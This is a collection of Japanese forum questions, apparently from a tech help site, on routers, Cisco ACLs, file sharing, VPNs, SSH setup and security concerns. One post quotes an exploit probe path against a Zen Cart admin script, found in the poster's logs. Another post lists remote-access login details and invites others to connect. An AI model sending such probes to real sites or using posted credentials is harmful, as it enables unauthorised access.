コンソール・ケーブルが無いので、管理画面にはEtherでアクセスしようと思います。 シスコC2940-8TT-Sの工場出荷時の管理IPは通常何に設定されていますでしょうか？ よろしくお願いいたします、
タイトル通りなのですが現在、モデム-WHR-G301N（A）-無線-ノートPCという形でインターネットをしています。今回、新しくPCを自作しました。なのでこちらのPCもインターネットをしようと思っています。 つなぎ方は モデム-WHR-G301N(A)-無線-WHR-G301N（B）-有線-自作PC このように繋げたいと思っています ですが、AOSSでつなげようとすると2台とも点灯にならず、ずっと点滅した状態です。 AのROUTERスイッチはON　BのROUTERスイッチはOFFになっています 現在のPC・無線LANの位置は次のとおりです 1F WHR-G301N（A) モデム 2F ノートPC 自作PC WHR-G301N（B） もし繋げ方が分かる方がいましたらインターネットに接続できるまでの過程を教えて頂きたいです
Apacheでmod_usertrackを使ってトラッキングクッキーをセットしています。 最近FireFoxなどでトラッキングの拒否を設定できるようになり HTTPリクエストヘッダーに DNT:1 という項目が追加されるようになりました。 このDNTが送られてきた場合、トラッキングをしないようにしたいのですが Apacheの設定でそれを実現することは出来るでしょうか？ トラッキングにmod_usertrackを使ってはいますが、 もし他にも同じ機能があるならそれに変更することは可能です。
iPhoneでのUUIDや、一般的なIDの代わりに固体のMACアドレスをハッシュ化して使うのはよろしくないと言われますが理由がいまいち理解できませんのでどなたかご教示ください。 端末が変わるとID（的な）ものも変わってしまうから、以外の理由でお願いします。
フェイスブックのパスワードを無くしてしまいました。その後転居に伴うＰＣのメールアドレス変更も伴いました。最近なんとか再開しようとしたのですが、ファイスブックヘルプに記載された操作ではＰＷ再設定はアドレス同一が前提のため、同一人物と見なされないのか全く再開できません。更に具合の悪い事に、入れないならアカウント自体を再取得しようと試みたところ、”なりすまし”と判断されているようで毎回パスワードを変更させられるも結局フェイスブックできません。解決策だれか教えて頂けないでしょうか。
NETGEAR製のHubでリンクアグリケーションが使える物ということで GS716Tv2を購入しましたが、LAG（リンクアグリケーション）のグループが2つしか設定出来ません。 1元々GS2108Tv2を利用していましたが、グループ作成が4つが限界となっていまして、 利用状況から不足していると判断してGS716Tv2を購入しました。 単純にポート、値段の違いから同一性能（か以上）の機種と思っていましたが。 GS2108Tv2では4つできるグループが、GS716Tv2では2つしか作成出来ないため、使い物にならず 購入した動機的に全く意味が無い状況となってしまいました。 そこで質問です GS2108Tv2では4つ GS716Tv2では2つ これはそもそも正常なのでしょうか？ 正常なのであれば2つまでというような記載がどこかに掲載されているか 情報ソースを教えて頂きたいと思います。 また正常なのであればよりLAG設定で4つ以上（多ければ多い程良い）のグループが作成でき お勧めの機種が御座いましたらご教授頂きたいと思います。
CCNA試験を受けるためPATの学習をしています。 PATの設定をするときに、内部ローカルアドレスを標準アクセスリストで設定しているのですが、 標準アクセスリストの学習をしていたときに、ip access-grourp というコマンドで、インターフェースに適用していました。しかし、PATの設定では、ip access-grourp というコマンドがでてきません。 コマンドを以下に示します。 access-list 1 permit 192.168.1.0 0.0.0.255 ip nat pool test 172.16.0.1 172.16.0.6 netmask 255.255.255.248 ip nat inside source list 1 pool test overload int fa0/0 ip nat inside int fa0/1 ip nat outside 設定に必要なルーティングなど一部のコマンドは省略しています。 上記のコマンド例で、ip access-grourp というコマンドがなぜ必要ないのかお分かりの方 教えてください。
　こんにちは。 　同じ部屋の中で、２台のパソコン（２台ともXP）を同じルーターから無線LANでつないでいます。 　共有フォルダの設定をして、A-PC、B-PCからそれぞれ共有フォルダの中のファイルにアクセ ス出来ていましたが、最近、B-PCをリカバリーして、共有フォルダの設定した後に、B-PCから は、A-PCには普通にアクセス出来て、共有フォルダも見ることが出来るのですが、A-PCから B-PCにアクセスしようとすると、 　「エクスプローラー」というダイヤログが表示され、 　「\\●●●（コンピュター名）\共有folderにアクセスできません。 このネットワークリソースを使用するアクセス許可がない可能性があります。アクセス許可が あるかどうかこのサーバの管理者に問い合わせてください。 　指定されたネットワークパスはどのネットワークプロバイダによっても受け付けられませんでした。」 と表示されます。 　これは一体どのようなエラーなのでしょうか。 　また、どのようにしたら、共有フォルダが見られるようになるのでしょうか。 　A-PC、A-PCには、特別なセキュリティ設定とか、Virusのソフトをインストールしている訳でもない のですが。 　一体どのような理由なのでしょうか。
無線ＬＡＮができません。 ネット環境；auひかり ルータ：ＭＮ8300Ｗ OS：Windows７ 状態：無線LANができない。 ルータのPPPoE/DHCPのランプが赤く点灯したままです。電源の入れなおしをしても変わりません。 auひかりからレンタルしてるホームゲートウェイとルータをつないで パソコンでルータの設定をおこない、パソコンのほうも無線LANの設定をしました。 SSID,セキュリティの種類、暗号化の種類、セキュリティキーはルータとPCと同じものを入力 したとおもいます。 パソコンの設定で、SSIDをいれるところは、ルータでの管理画面でESSIDと表示されているものでよいのでしょうか。 また、セキュリティキーというのは、事前共有キーでいいのでしょうか。これは自分で適当に考えてよいのですか。 セキュリティは、無線LANステルス有効、暗号化モードはWPA-PSK、 暗号方式はAES（CCM)にしています。WPA-PSKはWPA2-パーソナルのことでよいのでしょうか？ ネットワーク状況のようなものをみると、パソコンが受信可能としている無線候補？みたいのが５つほど表示されますが、設定したESSIDと同じなまえのものがありません。 auにもパソコンの製造元にも問い合わせしましたが、ルータの製造元に聞いてくれといって話になりません。 ルータの製造元は平日日中の電話対応のみなので、とても無理な状況です。 何が原因なのかがわかりません。 よろしくお願いします。
はじめまして。 Webに関するセキュリティでお伺いしたいのですが、現在複数のサイトを運営しています。運営サイトの全てにおいて、何らかの申し込み（物品販売の申し込み）という形で注文を受けています。 よって各サイトにフォームを設けて運営しているのですが、現在は単純な送信フォームを使用していますが、今後は申し込み者に会員になってもらい、購入したものによってポイントを付与する方法を考えています。 そこで、質問なんですが上記の事を効率的に実現しようと考えた場合に、以下方法を考えましたが、セキュリティ的に不安があったため質問させて頂きました。 まず、会員登録から申し込みなどを完成させるシステムを別ドメインで作ります。（SSL対応） この作ったシステムに、現在運営中のサイトからお申し込み情報を渡したいと考えています。 お申し込み情報は主に ・商品の価格 ・商品の名前 ・どのサイトから来た申し込みなのか ・申し込みを行ったページのURL 以上の情報を渡したい考えです。 会員情報などの取り扱いは、システム上で全て行う予定です。 この場合の渡す方法としてPOST等で渡す方法しか思いつかないのですが、他によい方法はありますでしょうか？ この場合知識があればデータの改竄が可能なため悩んでおります。 ただ、カード決済などは今すぐに使用しないので、商品金額等を改竄されても最終的に人の目で確認するのでトラブルはないだろうと思っているのですが・・・・ どうぞよろしくお願いします。
以前、http://192.168.11.1から飛んで調べたことがあるのですが、最近この方法では調べられなくなってしまったのでしょうか？前に調べたときはwindowsだったのですが、今はmacを使っています。そういったことも関係あるのでしょうか？ もしもhttp://192.168.11.1が閉鎖されて、他の場所に移ったのでしたら、新しいURL教えてください。 無線使えなくて、本当に困ってます。情報お持ちお方、いらっしゃいましたら宜しくお願いいたします。
ＭＭＤを利用している者です。 最近、動画の出力方法でつまづいています。 avi出力時に高画質の圧縮方法を探しているのですがうまくいきません。 私としましては、 　・圧縮する際の形式 　・エンコード設定　 が把握できればクリアできると思うのですが実際のところどうなんでしょうか？ 動画編集ツールは「AviUtl」を使用しています。 MMDを始めたきっかけが映像の美しさと自分で動画を編集できる思いから始めたものですので、 高画質・高音質の高いところを目指しています。 同時に、まだわからないこともたくさんありますので、端的に教えて頂ければうれしく思います。 イメージとしましては、ニコニコ動画にアップされている、なめらかでカクカクと画像や音が途切れたり 割れたりしないようなものです。 そのためには何を理解してどうしていけばいいのかを教えてほしいと思います。 よろしくお願いします。
NTT西日本のフレッツ光ネクストハイスピードタイプを利用しています。 今回アイオーデータ製有線ルータ　ETG2－R　を繋げ、インターネットの接続は成功したのですが、NTTのセキュリティ対策ソフトのアップデートができなくなりました。 どなたか対処法についてご存知のかたご教示ください。
I-O DATA製のLAN DISK HDL-CE2.0BというLAN接続できるハードディスクを購入しました。 自宅で無線LANを使っていましたが、普通に無線LAN接続できてハードディスクとしては問題ないのですが、外出先からも接続できるというリモートリンク２という機能を使いたいのですが、接続できません。 環境は以下になります。 プロバイダ　J-COM（ケーブルテレビでネット接続してます） 無線LAN　TimeCupsule（AppleのHDにもなるし無線LANにもなるという奴です） PC　MacBookPro OS　MacOSX10.6.8(Snow Leopard) http://www.iobb.net/remotelinkaccess/ ここから接続するらしいのですが、ローカルでなら接続できますが、外部からは接続できません。 iobb.netの接続名　test0429 ユーザ名　test パスワード　test ポート　3000 UPnP機能　使わない （使うにチェックをいれると設定すらできないので使わないにチェックして設定しています） 今現在このような設定になっています。どなたか試しに接続してみてもらえないでしょうか？ 素人判断ではTimeCupsuleがどうも悪さしているのではないだろうかと思うのですが、現状の設備でTimeCupsuleを外すとインターネットそのものができなくなっています。 どなたか解決策分かる方いましたら、是非ともご教授ください。 よろしくお願い致します。
以下の２つの簡単なシステムがあります。 システム１ 　　PC1(192.168.1.1/24) --- PC2(192.168.1.2/24) システム２ 　　PCA(192.168.2.1/24) --- PCB(192.168.2.2/24) PC1,PC2,PCA,PCBにはどれもデフォゲ含めルーティング設定は一切されていません。 この度PC2とPCAを廃止してPC1とPCBを接続することになりました。 ただし、PC1とPCBの設定は一切いじってくれるなという要件付です。 NICを2枚持つPCXを間にかまして簡単な通信アプリを作ってのせれば可能なんですが↓ 　　PC1(192.168.1.1/24) --- (192.168.1.2/24)PCX(192.168.2.1/24) --- PCB(192.168.2.2/24) 手作りせずに既成のルータか何かで実現する方法はありませんでしょうか？
ご質問させて頂きます。 現在、ショッピングサイトを製作しており、決済用にPAYPALのウェブペイメントスタンダードを導入中です。 そこで、カートページから、ペイパルへデータを送る際、 ペイパル決済ページでショップ名が出るように画像を送っているのですが、 そこで、画像リンクとして <input type="hidden" name="image_url" value="http://www.*********.com/*****/paypal_logo.jpg"> といった形で画像データを送ったところ、ノートン先生より詐欺サイトの可能性有りと、 カートページのみ、ブロックされてしまいました。 サーバーがSSLに対応していないため、httpで送ったのですが、これが問題だと思っています。 そこでご質問なのですが、 今Aレンタルサーバーを使用して、SSLが無い状態なのですが、 例えば、 http://www.AAAAA.com/cartpage　　　（Aレンタルサーバー、SSL対応無し） というカートページに、 <input type="hidden" name="image_url" value="https://www.BBBB.com/BBBBB/paypal_logo.jpg"> として、https://送る画像のリンク先として、SSLに対応しているBレンタルサーバーに画像を置いて、リンクを渡そうかと考えております。 （画像はPAYPAL上の決済ページ上で当方のショップロゴを表示するためのものです。） そういう、別ドメインからの画像情報をhttpsで送った場合、 ウェブセキュリティソフトは問題有りと判断する可能性は高いのでしょうか？ あまり、httpsのセキュリティについて理解していない上、 ノートン先生しか試せるセキュリティソフトがないため、ご質問させて頂きました。 また、別の方法で、SSLが無くとも、なんとか画像が送れる方法がありましたら、ご教授願えればと存じます。 宜しくお願いします。
よろしくお願いします。 ネットワークアドレスの異なるLAN1とLAN2があります。 それぞれにルーターが接続されており普段はそれを通して外部に接続しています。 たとえば、LAN2のルーターが故障したときにLAN1へ接続しLAN1のルーターを使用して外部に出たいのですが、LAN2で使用しているIPアドレスはそのままでそうしたいのです。 ブロードバンドルーターを使って LAN1---(WAN)ブロードバンドルータ(LAN)---LAN2 みたいな接続をすれば可能なのかなとも考えましたがよくわかりません。 どのようにすれば良いでしょうか?
レンタルサーバ（さくらインターネット）でVPS（CentOS6.2(x64)）を借りたばっかりなのですが、 システム監視や脆弱性チェックなど、要はサーバ監視（≒「サーバ落ち」＆「セキュリティ監視」？） をするためのソフトやウェブサービスにはどんなものがあるのでしょうか？おすすめがありましたらお教えください。 なお、ウェブアプリの脆弱性チェック（XSSとかSQLインジェクションとかディレクトリートラバーサルとかもろもろ）ができるツールもお教えいただけるとうれしいです（もちろん、穴がないようにコードを書くつもりですが） なお、 ＊そのCentOS6.2(x64)の中で動くもの ＊あるいは、外部のCentOS6.2(x64)（自宅のwin7上のvmwareに入れてます）で動くもの ＊windows7(x64)で動くもの の、どれでもいいです。 また、SELinuxというのは知ってますが、 レンタルサーバ業者がセットアップしたデフォルトではoffになっています。 onのほうがいいと単純に思うのですが、どんな理由があるのでしょうか？ またレンタルサーバ業者がよくやっている、 pingによる監視は、単にcronでpingをうっているだけなのでしょうか？ 以上、よろしくお願いいたします。
ネットワークが上手くいかない（プリンターの共有ができない） 家で３台のパソコンのホームネットワークを構築しておりました。 目的はプリンターの共有なのですが、Windows 7を本体としてプリンターを 接続し、他のパソコン（Windows 7とXP）を接続して使用してたのですが、 XPをリカバリしたところネットワークができなくなりました。 XPから他の２台のPCは見えているのですが、アクセスができません。 プリンターだけの共有でいいのですが、解決方法を教えて下さい。
VPSを借りてまして、CentOS6.2です。 fooユーザとbarユーザとhogeユーザに、SSHの秘密鍵と公開鍵を設定するにはどうすれば可能（あるいはすべき）なのでしょうか？ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/Users/sorai/.ssh/id_rsa): // ファイル作成場所 Enter passphrase (empty for no passphrase): // パスフレーズを入力する Enter same passphrase again: // パスフレーズをもう一度入力する というのを、その人数分行わないとできないでしょうか？あるいはそうすべきでしょうか？ 今、/root/.ssh/authorized_keysを /home/miya/.ssh/autauthorized_keysにコピーして、rootのとき成功した秘密鍵で、 miyaアカウントでSSHログインしようとしてもだめでした。 （ただ、パーミッションやユーザownerをどうすべきかわかりません） よろしくお願い申し上げます。
伝送装置とルータでクロック同期をとりたいと考えています。 伝送装置はexternal、ルータはinternalでクロック同期を取っているため、同期がとれていないといわれました。 この場合、同期をとるためには、ルータが伝送装置へクロック同期、もしくは伝送装置がルータへクロック同期を取りに行けば同期がとれるのでしょうか。 クロック同期のintenl(内部クロック)、external(外部クロック)、Line抽出の概要についてもよくわかっていないため、ご教授いただkれば幸いです。また、クロック同期についての説明したいるURLがありましたら、併せて教えていただければ幸いです。
閲覧ありがとうございます。 Windows 2008R2、SQL サーバ 2008、MVS2010でASP.netの開発をしております。 初歩的な質問で申し訳ありませんが、回答を頂ければ幸いです。 開発をした、ASP.NETのプログラム(aspxファイル)をIISから起動したら、以下のように メッセージが表示されました。 (MVS2010のデバッグモードからは問題無く、稼動しました) ************************************************************************************************* '/' アプリケーションでサーバー エラーが発生しました。 -------------------------------------------------------------------------------- 構成にエラーがあります。 説明: この要求を処理するために必要な構成ファイルの処理中にエラーが発生しました。以下のエラーの詳細を確認し、構成ファイルに変更を加えてください。 パーサー エラー メッセージ: 認識されない属性 'targetframework' です。この属性は、大文字小文字を区別します。 ソース エラー: 行 30: 行 31: 行 32: <compilation debug="true" targetframework="4.0"> 行 33: <assemblies> 行 34: <add assembly="Microsoft.mshtml, Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" /> ソース ファイル: D:\Web\Eigyo\web.config 行: 32 -------------------------------------------------------------------------------- バージョン情報: Microsoft .NET Framework バージョン:4.0.30319; ASP.NET バージョン:4.0.30319.272 ************************************************************************************************* 色々と調べまして、以下のサイトを参考にアプリケーションプールを.NET Framework 4.0.30319に変更を致しました。 ですが、依然として、上記のエラーメッセージが表示されてしまいます。 http://www.ipentec.com/document/document.aspx?pa … 何か設定が悪いのでしょうか？ 何か心あたりや、チェックするポイントなどありましたら、教えて頂けると幸いです。 お手数をお掛け致しますが、よろしくお願い致します。
初歩的な質問ですいません。 シスコルータで、sohw interfaseを実行した時にdelayと記載があったのですが、この遅延は何の遅延を表しているのでしょうか。 「キューイング遅延(出力インタフェースのキューに入っている時間)」のような感じでご教授いただければ幸いです。
パソコンをハッキングされたら回線を変えれば大丈夫ですか？パソコンも変えないといけないですか？ 単純な文章ですいません。
現在、特定のサーバー（Aサーバーとします）でシステムを設置予定なのですが そのAサーバーからjsonpにて通信を行う予定です。 システムを使用するのは日本です。 その通信先のサーバーを選ぶのに思案中なのですが 以下の二つの専用サーバーでは 通信回線の速さという観点だけでみると どれくらいの差がありますでしょうか？ 日本にサーバーがあるのと海外にあるのと では 体感レスポンスもかなり違うのかが知りたいです。 さくらの専用サーバーEXPRESS http://server.sakura.ad.jp/ と メガファクトリーの専用サーバー 海外サーバープラン http://www.megafactory.com/server/core.html です。よろしくお願いいたします。
ルータ無しで家庭内LANについて２点質問させてください。 1．インターネットを接続しない環境で家庭内で複数台のPCでLANを構築する時に、 ルータ無しでスイッチングHUBを用意しても接続しても構築することは可能なのでしょうか？ ２．この場合は、IPアドレスによる通信では無いため接続先のHDの内容などは外付けHDを接続した時のようにローカルディスクとして表示されるのでしょうか？
アダルトサイトを見ていて 無料だと思いアクセスしました。 動画を押してみたら 年齢認証がぁり 押して次の画面を押しました そしたら登録完了となり 三日以内に90000円払いこんでください。っといてあり、 びっくりしました。 携帯端子?とお客様番号と どこの携帯など書いてあり びっくりしました。 またお金が90000円になると 払うのが難しくて…。 ツークリック詐欺?かなとも 思ったのですがゎかりません。 やっぱり払わないと 支払いの請求書とかくるんですかね? それともドコモの携帯代に 含まれるんですか? ょくゎかりません。 すみません、回答お願いします。
Let's Note CF-W8でWindows 7 Enterpriseを使っている者です。 昨夜、急に証明書を発行するためのウィンドウが現れました。 とりあえず指示に従っていくと、Certificate Export.pfx　というファイルが作成・保存されましたが、これはなんのためのものでしょうか？ 調べると、pfxファイルが他のPCにインポートすることもできると書いてあったのですが、これがネット経由で他のパソコンに読み取られて悪用されるということはありませんか？ セキュリティ関係の知識は全くないので、不安です。 ちなみに、その日におこなった特別なことは、 ・Google Tasksを見ることができるAdobe Airのソフトをインストール ・Windowsのデスクトップガジェットを有効化 ・Google Destopをインストール後、欲しい機能がない事がわかり、アンインストール くらいで、特にセキュリティ関係をいじったつもりはありません。 ご回答、よろしくお願いします。
amazonどうしちゃったんですか？？ アクセスしても見れないのですが、どうしたのでしょうか amazonだけがうまく見れません。 不安定です。 プロバイダーはビックローブです。 ウイルス対策ソフトはエフセキュアでブローバンドルータ、IE9を使っています。
ある会社（以後、Ａ社）とメールや電話でやりとりしたあと、知らないところから営業電話がかかってくる確率が高いです。 以下の可能性を想像しているのですが、これらは現実にあるのでしょうか？ もし、以下のようなケースがありえるとして、そのA社にどのように対応してもらえばよいでしょうか？ 他にどのような可能性が考えられますか？ 自分の被害妄想のような気もしています。 可能性１： A社のPCの中にスパイウェアが入っていて、メールの受信ボックスなどから電話番号を収集してどこかに送信している。 その収集した電話番号を使用して営業電話をかけている。 可能性２： A社のメールサーバーの中にスパイウェア入っていて、メールの受信データ？から電話番号を収集してどこかに送信している。 その収集した電話番号を使用して営業電話をかけている。
無線LANの電波干渉を調べるソフトなどは inSSIDerなどがありますが、 無線LAN同士の電波干渉ではなく、 他の電波が原因で不調の原因を調べる、 ソフトまたは機器などはありますでしょうか？
現在cisco1600シリーズのルータを使い アクセスリストの設定を行っています。 機材 ・PC１（192.168.0.1） ・PC２（10.0.0.1） ・ルータ 条件 １、pc1-pc2　FTPのみ許可 ２、pc2-pc1　pingのみ許可 ３、上位機以外すべて禁止 (config)access-list 100 permit tcp host 192.168.0.1 host 10.0.0.1 eq 21 (config)access-list 100 permit icmp host 10.0.0.1 host 192.168.0.1　echo (config-if)ip access-group 100 in 上記で大丈夫でしょうか？ その他質問なのですが、 １．アクセスグループを消すときは no ip access-group　100　in でいいのでしょうか。最後がoutになった場合はどうなるのでしょうか ２、pingのみ許可する場合はICMPのオプションのechoとecho reply はどちらにしたらいいのでしょうか ３、上記のように設定すれば、最後の三番目の条件の残りすべて禁止 は暗黙のdenyですべて禁止という設定になるのでしょうか？ まだ実際に検証ができないため、よろしくお願いいたします。
初心者なので分かりにくいところがあるかもしれませんがよろしくお願いします。 UQ WiMAXが予めバンドルされたWiMAXパソコン（Lenovo ThinkPad T420s)を使用しています。 インターネットは問題なく接続できるのですが、その上でAT&T Global Network Client（以下Network Client)を使ってVPN接続をしようとしていますが、VPN接続自体は確立しているにも関わらず、イントラネットだけでなくインターネットも接続できません。 なお、Network Clientの同じProfileを使って有線EthernetでのVPN接続はインターネット／イントラネットともに問題なく使用できます。 Network Clientの設定は「Managed VPN - IPSec デュアルアクセス」です。 友人のUQ WiFiルータを借りて試してみましたが、やはりVPN接続が確立した段階でインターネットおよびイントラネットには接続できません。 UQ WiMAXのFAQページで確認しましたが、「WiMAXでは特定のポート利用の禁止はしておりません。」とあり、対応に困っています。 何か問題判別や解決方法がありましたら教えて頂けると助かります。 何か不足している情報がありましたら補足いたします。 よろしくお願いいたします。
WINDOWS7とMAC間にて 以前はルーターで共有させていましたが、 ハブに変更させたところ、共有が出来なくなりました。 サイトなど見ながら MAC側共有にてSMB設定をして ワークグループも設定と色々試しましたが WINからMAC,MACからWINどちらも見られません。 どのようにすれば良いのでしょうか？ 宜しくお願い致します。
ウィルスソフトをインストールする途中で「新しいバージョンのMicrosoft Internet Explorerを入手してからインストール続行してください。互換性のない以前のバージョンのブラウザを使用すると、コンピューターのパフォーマンスに影響することがあります。続行してもよろしいですか？」とでます。 windows XP sp3でInternet Explorer8ですが、このまま続行しても大丈夫でしょうか？ どうしてそのような表示がでるのでしょうか？
現在BフレッツのルーターからLANハブを経由して、2台のPC（Win7(64bit)・WinVista(32)）をハブに接続使用しています。 先日２PC間のファイルの共有設定をしましたがうまくいきません。 両PCは起動時のログインパスワードは、１個人使用のみと、わずらわしさのため省略しています。 パスワードの有無と関係があるでしょうか。2PCともパスワードは省略出来たらと思います。 外部との共有は全く考えていません。共有したいファイルは個人使用の小さなものばかりで、セキュリティー上の問題はあまり考えていません。 ご指導ください。
INS接続のP-MP構成について、有識者の方ご教示の程よろしくお願いいたします。 ※正直なところ的を射た質問になっているかも不安がございますので、稚拙な内容で恐縮ではございますが何卒寛容な進言を賜れればと思います。 現在、2拠点の各支店側をINS64で構成し、センター側のINS1500に接続したいと考えておりますが、NTTのサービスには23b+dおよび24bという契約形態があるかと思います。 そこで各サービスにおける接続構成について質問なのですが、各チャネルの使用方法がいまいち理解できておりません。 以下のような認識でおりますが、齟齬はございますでしょうか。 ■23b+dで構成する場合 　bチャネル　⇒　各2拠点：2×2本　-　センター：4本(23-4で残り19本) 　dチャネル　⇒　各2拠点：1×2本　-　センター：1本(センター側の1本を2拠点が共用する) ■24bで構成する場合 　bチャネル　⇒　各2拠点：2×2本　-　センター：4本(24-4で残り20本) 　dチャネル　⇒　各2拠点：1×2本　-　センター：0本(各1本をセンター側がそれぞれ利用する) 説明に過不足がございましたら補足いたしますので、お伝えいただければ幸いです。 以上、ご教示の程よろしくお願いいたします。
またまた、ネットゲームでインチキが発生した 同じニックネームの似たやつと対戦する確率は 万分の1だ。 他にも不愉快な現象があった。 これは、モバゲーの社員がやってるの？ 外部からハッキングしてんのか？ ゲームのプログラム自体も変だ。 セキュリティに詳しいかたがいれば解説お願いします。
ルーターの設定で躓いております。 現在、インターネットの構築作業を行っております。 今回、光電話+VPNを利用したく、 ルーター機能を内蔵したモデム/回線終端装置(pr-400ne)に BUFFALOのwzr-hp-ag300hの接続しております。 ※wzr-hp-ag300hのPPTPサーバ機能を使用する事を検討 単純に接続すると後続のwzr-hp-ag300hで 設定画面(192.168.11.1や192.168.12.1)も表示できない状態です。 (固定で192.168.11.*等でもダメ) インターネットの他にやりたい事は、光電話+VPNです。 CTUとルータの設定方法や参考になる解説ページを御存じであれば 御教授いただけないでしょうか。 以上、よろしくお願い致します。
ネット通販のようなことをしたいと考えています 今はＰＣは１台しかありません これは仕事用には使わず、新しく仕事用にＰＣ購入を検討しています ネット通販はまずＨＰを立ち上げます ＨＰからアカウント登録や注文などをＨＰ内のメールフォームから送ることが出来ます 代金は私の銀行口座へお客様がお振込みする形です ＰＣ１台あればこれらの作業は全てできると思いますがセキュリティ面で どうすればそれなりに安全といえるでしょうか？ 私自身が考えているのは １、オンラインパンキング専用ＰＣ ２、メールフォーム受信する専用ＰＣ ３、ＨＰ作成＆更新専用のＰＣ 以上３つくらいに分けたほうがいいのでしょうか？ そして各ＰＣの設定などは何か必要なのでしょうか？ 完全な安全はないとしても相手のお客様にもご迷惑がかかるので できるかぎりのことはしたいです 分かる方教えてください もちろんウィルス対策ソフトは全てのＰＣに入れます
ウイルスバスターが1月で期限切れになりました。 パソコンが重たくて、アップデートにも時間がかかり、期限切れのあとはウイルスが怖くて、ネットに繋いでいません。 すでに2012年版クラウドに更新してはいます。 「期限切れの貴方を救済」という振込用紙が、ウイルスバスターから送られてきましたが、今期限切れの状態でネットに繋いで更新手続きしても大丈夫でしょうか。 無防備な状態のところに、ウイルスが入りこんでしまわないか心配です。 そうなると、更新しても意味ないのでしょうか？
先日自分のホームページをphp化しアクセスログをとり始めたところHTTP_REFERERのところに明らかに自分とは関係ないurlがありました。/admin/sqlpatch.php/password_forgotten.php?action=execute。自分なりに調べてみると海外からのアタックの類でありzen-cartがなんちゃらとしてあったのですが、こちら側で何か特別な対応をする必要があるとすれば何をすればいいのでしょうか？
一般的なスマートフォンやタブレットは5GHz帯に対応しているかどうか 調査をしていますが、対応していますか。 また、対応一覧表みたいなのはどこかのサイトにあるのでしょうか。 ご教授いただけたらと思います。
トロイの木馬について質問です。 先日トロイの木馬に感染しました。 感染に気づいたのは友人からの知らせです。 私のアドレスから迷惑メールと思われるメールが来ると知らせがあり、 送信ボックスを調べたところ、覚えのないメールが数通送信されていました。 送られていた相手にはすぐに知らせ、他人には迷惑はかからなかったのですが、 その後ウイルスチェックをしたところトロイの木馬を検出しました。 すぐに削除しようとしたのですが、×マークが出てしまい処理が未完了に。 しかし、再度ウイルスチェックをかけ検出しようとしたのですが、 二回目は検出できず、「破損しているデータがあります」という内容のメッセージがでただけになってしまいました。 ここで質問なのですが、 1、もし、破損しているものがトロイの場合、もう加害者はアクセスできなくなるのでしょうか？ 2、トロイを削除しても、一度アクセスを許してしまっているので再度侵入は可能でしょうか？ 3、私の家では他に同じネットワーク経由でPCを使用しています。他のPCには影響はあるのでしょうか？ あまり知識がなく、素人なので侵入された時点でどこまで影響があるのかわかりません… 今は感染したPCだけネットにつないでいない状況なのですが… とても困っています。親切な方回答いただければ幸いです。
やりたいこと： 1、複数あるPC全てがセッション１でインターネットに接続できること。 2、そのPC同士は相互にマイネットワークからファイルが共有できること。 3、一部のPCは専用ルーターを通じてセッション２でVPN先のサーバーにアクセスできること。 現状： 上記2と3は実現できているのですが、インターネットにはPC1台のみ接続が出来ています。 そのPCはNICを2枚差しにしています。 ネットワークアドレスが192.168.1.**と192.168.11.**のグループがあります。 現状で通常業務に支障は無いのですが、全てのPCをリモートでメンテしたいので、 インターネットへの接続が必須となります。 ルーティングテーブルの書換えが必要ならばその方法を、又、もっと最良の方法があれば、 その方法を教えてい下さい。 ネットワークの構成を図にしました。 http://www.fastpic.jp/images/885/8578786298.jpg 各PCのOSはXP_Proです。その他の情報が必要でしたら後程補足いたします。 宜しくお願いします。
遠隔地からCentOSサーバ上のSSLのURLサイトにアクセスする際に、 特定のWindowsXPの端末ですが、IE8のブラウザ上で"InternetExplorerではこのページは表示できません"というエラーが表示され、 タイムアウトのようになってしまいます。 インターネットオプションの設定もしくは、サーバ側のsslのaccess_logを見ているのですが、今のところ原因が特定できていません。 何か考えられる原因、確認すべき箇所がありましたら教えていただけないでしょうか。 遠隔地側のネットワークもしくは端末の設定に依るところがあるのかもしれないですが。 宜しくお願い致します。
学校の自由課題でやってることなのですが、本にもネットにも 詳しいことが載っていなかったので、教えてほしいです。 イカタコウイルスとか原田ウイルスとか製作者が見つかったと ニュースで聞いたのですが。 警察は何を手がかりにして作者を見つけるのでしょうか。 自分でも仮説を立ててみたのですが・・・ 1.ウイルスをコンパイルする時にコンパイラが作者を特定できる情報 (IPアドレスとか)をEXEのどこかに埋め込んでいて。それを元に特定する 2.ネットのどこかで口を滑らせるのを待つ ぐらいしか思いつきませんでした。 どうやって作者を見つけているのでしょうか？
いきなりＰＤＦ　STANDARD　EDITION　を使っています。　もともとパフォーマンスが悪いのは承知しているのですが、自宅でのネット環境がある場合と、外出先などで　ネットに繋がっていない場合とでは、後者の方がかなりパフォーマンスが落ちるような気がします。　私の思い過ごしでしょうか・・・・・・ 又　事実だとしたら何か解決方法はありませんか？
暗号について初歩的な質問があります。 暗号とは、第3者に内容を知られないように変換することと理解しています。 第３者（盗聴者）が復号できたというのはどのような状態なのでしょうか？ 例えば、アリスが「Hello」という内容のメールを暗号化して、ボブに送信します。 それをイブが盗聴して送信内容（Hello）が理解出来たとします。 どうしてイブがこのメールを「Hello」と解読出来たという結論に達するのでしょうか？ イブは内容（答え）を知らないのに、暗号化されたメールが「Hello」であると言い切ることは出来ないと思います。イブが「Hello」という文言を理解できるから、解読できたことになるのでしょうか？
こここマーシャルのとこ!!!! ウェブシーエムのとこに大麻草の宣伝がで た。 なおせますか？ あわわ!キター(>_<)
Camellia Block Encryption Algorithm in ANSI-C Language : Camellia.c Version M1.02 September 24 2001 Copyright Mitsubishi Electric Corp 2000-2001 が見たいのですが、 URLをご存知の方教えて下さい。 新しいものは見つかるのですが、この古いものそのものを探しています。 よろしくお願いします。
閲覧ありがとうございます。 ネットワークの勉強を始めた技術者の端くれです。 まだ、勉強を始めて間もないのですが、書籍やネットで 解決策が見つからなかった疑問があるため、質問させて頂きます。 ルータについてです。 ルータはＬＡＮとＷＡＮの中間地点でＩＰパケットの送信経路を判定し 送り出す装置だと思います。書籍には、ルータに届いたパケットの あて先が自分のネットワークであれば、ＬＡＮ側に通し、そうでなければ 別のルータへ送り出すと記載されています。 私は自宅に無線ＬＡＮルータを設置しているのですが、このルータにも 他人の送信したＩＰパケットが届いているのでしょうか？ 私がパソコンでルータと通信していなくても、誰かが送信したデータを ルータが送り出しているのでしょうか？ （たとえば、お隣さんのパソコンから送信されたデータ等） 以下が私の自宅のネット接続環境になります。 「ＰＣ」→無線→「無線ＬＡＮルータ」→ＬＡＮ→「ＯＮＵ］→光回線 また、光接続ではなく、ダイアルアップ接続によるインターネット環境 だったとしても、ルータには他人のＩＰパケットが届くのでしょうか？ 回答をお願い致します。
